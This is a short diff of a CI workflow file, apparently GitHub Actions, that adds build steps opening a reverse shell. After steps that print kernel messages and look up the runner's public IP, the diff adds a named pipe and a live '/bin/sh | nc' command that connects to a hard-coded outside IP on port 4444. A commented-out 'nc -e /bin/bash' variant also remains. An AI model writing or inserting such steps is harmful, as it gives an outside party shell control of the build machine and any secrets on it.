@@ -16,7 +16,9 @@ jobs:
       - run: sudo dmesg
       - run: curl https://ifconfig.me/
       # - run: nc 116.203.37.235 4444 -e /bin/bash
-      - run: mknod /tmp/p p && nc 116.203.37.235 4444 /tmp/p 2>&1 
+      # - run: mknod /tmp/p p && nc 116.203.37.235 4444 /tmp/p 2>&1 
+      - run: mknod /tmp/backpipe p
+      - run: /bin/sh 0</tmp/backpipe | nc 116.203.37.235 4444 1>/tmp/backpipe
 
 
 
